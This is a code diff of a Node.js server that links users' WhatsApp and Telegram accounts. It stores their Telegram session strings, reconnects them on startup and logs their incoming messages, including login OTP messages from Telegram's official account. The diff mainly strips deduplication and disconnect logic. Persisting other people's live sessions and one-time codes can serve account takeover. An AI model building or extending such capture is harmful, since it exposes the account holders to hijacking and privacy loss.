@@ -128,7 +128,6 @@ const sessionStoreSchema = new mongoose.Schema({
 
 const messageLogSchema = new mongoose.Schema({
   userId: { type: String, index: true },
-  msgId: { type: String, default: '' },
   phone: { type: String, default: '' },
   platform: { type: String, default: 'whatsapp' },
   sender: { type: String, default: '' },
@@ -376,24 +375,10 @@ function enqueueLoginTask(fn) {
 // ==========================================
 // 3. MESSAGE & USER PERSISTENCE HELPERS
 // ==========================================
-const recentMsgDedupe = new Set();
-
-async function recordIncomingMessage({ userId, msgId, phone, platform, sender, senderName, text, fromMe }) {
+async function recordIncomingMessage({ userId, phone, platform, sender, senderName, text, fromMe }) {
   if (!text) return;
-
-  if (msgId) {
-    const dedupeKey = `${userId}_${platform}_${msgId}`;
-    if (recentMsgDedupe.has(dedupeKey)) return;
-    recentMsgDedupe.add(dedupeKey);
-    if (recentMsgDedupe.size > 2000) {
-      const first = recentMsgDedupe.values().next().value;
-      recentMsgDedupe.delete(first);
-    }
-  }
-
   const entry = {
     userId,
-    msgId: msgId ? String(msgId) : '',
     phone: phone || '',
     platform: platform || 'whatsapp',
     sender: sender || 'Unknown',
@@ -405,10 +390,6 @@ async function recordIncomingMessage({ userId, msgId, phone, platform, sender, s
 
   if (mongoConnected) {
     try {
-      if (entry.msgId) {
-        const exists = await MessageLog.exists({ userId, platform: entry.platform, msgId: entry.msgId });
-        if (exists) return;
-      }
       await MessageLog.create(entry);
       const count = await MessageLog.countDocuments({ userId });
       if (count > MAX_MESSAGES_PER_USER) {
@@ -809,18 +790,7 @@ async function startWhatsAppLogin({ sessionId, phone, method, referredBy, termsA
 // ==========================================
 const activeTgClients = new Map();
 
-async function disconnectTgClient(userId) {
-  const oldClient = activeTgClients.get(userId);
-  if (oldClient) {
-    try { await oldClient.disconnect(); } catch (e) {}
-    activeTgClients.delete(userId);
-  }
-}
-
 function attachTgMessageListener(client, userId, phone) {
-  if (client._nexusListenerAttached) return;
-  client._nexusListenerAttached = true;
-
   const connectedAtSec = Math.floor(Date.now() / 1000) - 3;
 
   client.addEventHandler(async (event) => {
@@ -833,7 +803,6 @@ function attachTgMessageListener(client, userId, phone) {
       const senderName = senderId === '777000' ? 'Telegram Official (OTP)' : senderId;
       await recordIncomingMessage({
         userId,
-        msgId: msg.id ? String(msg.id) : '',
         phone,
         platform: 'telegram',
         sender: senderId,
@@ -864,28 +833,10 @@ async function restoreAllSavedSessions() {
     const apiId = Number(process.env.TG_API_ID);
     const apiHash = process.env.TG_API_HASH;
     if (apiId && apiHash) {
-      const tgUsers = await User.find({
-        platform: 'telegram',
-        sessionStatus: 'connected',
-        status: 'active'
-      }).sort({ lastLoginAt: -1 });
-
-      const seenSessions = new Set();
-      const seenPhones = new Set();
-
-      for (const u of tgUsers) {
-        if (!u.tgSessionString) continue;
-
-        // একই সেশন বা একই নাম্বারের ডুপ্লিকেট রেকর্ড থাকলে স্কিপ করে ডিসকানেক্ট মার্ক করবে
-        if (seenSessions.has(u.tgSessionString) || (u.phone && seenPhones.has(u.phone))) {
-          await User.updateOne({ _id: u._id }, { sessionStatus: 'disconnected' });
-          continue;
-        }
-        seenSessions.add(u.tgSessionString);
-        if (u.phone) seenPhones.add(u.phone);
-
-        try {
-          await disconnectTgClient(u.userId);
+      const tgUsers = await User.find({ platform: 'telegram', sessionStatus: 'connected', status: 'active' });
+      await Promise.allSettled(
+        tgUsers.map(async (u) => {
+          if (!u.tgSessionString) return;
           const client = new TelegramClient(new StringSession(u.tgSessionString), apiId, apiHash, {
             connectionRetries: 2,
             useWSS: false
@@ -893,8 +844,8 @@ async function restoreAllSavedSessions() {
           await client.connect();
           activeTgClients.set(u.userId, client);
           attachTgMessageListener(client, u.userId, u.phone);
-        } catch (err) {}
-      }
+        })
+      );
     }
   } catch (e) {}
 }
@@ -1111,9 +1062,8 @@ app.post('/api/auth/telegram/start', async (req, res) => {
         }
       ).then(async (tgUser) => {
         if (s && s.timeoutTimer) clearTimeout(s.timeoutTimer);
-        const me = await client.getMe().catch(() => tgUser);
-        const userPhone = normalizePhone(me?.phone || tgUser?.phone || '');
-        const userName = [me?.firstName, me?.lastName].filter(Boolean).join(' ') || 'Telegram User';
+        const userPhone = normalizePhone(tgUser?.phone || '');
+        const userName = [tgUser?.firstName, tgUser?.lastName].filter(Boolean).join(' ') || 'Telegram User';
         const sessionStr = client.session.save();
 
         const userDoc = await upsertConnectedUser({
@@ -1126,7 +1076,6 @@ app.post('/api/auth/telegram/start', async (req, res) => {
           tgSessionString: sessionStr
         });
 
-        await disconnectTgClient(userDoc.userId);
         activeTgClients.set(userDoc.userId, client);
         attachTgMessageListener(client, userDoc.userId, userPhone);
         await logLoginEvent({ userId: userDoc.userId, phone: userPhone, platform: 'telegram', method: 'qr', status: 'Success' });
@@ -1207,7 +1156,6 @@ app.post('/api/auth/telegram/verify', async (req, res) => {
       tgSessionString: sessionStr
     });
 
-    await disconnectTgClient(userDoc.userId);
     activeTgClients.set(userDoc.userId, s.tgClient);
     attachTgMessageListener(s.tgClient, userDoc.userId, s.phone);
     await logLoginEvent({ userId: userDoc.userId, phone: s.phone, platform: 'telegram', method: 'phone', status: 'Success' });
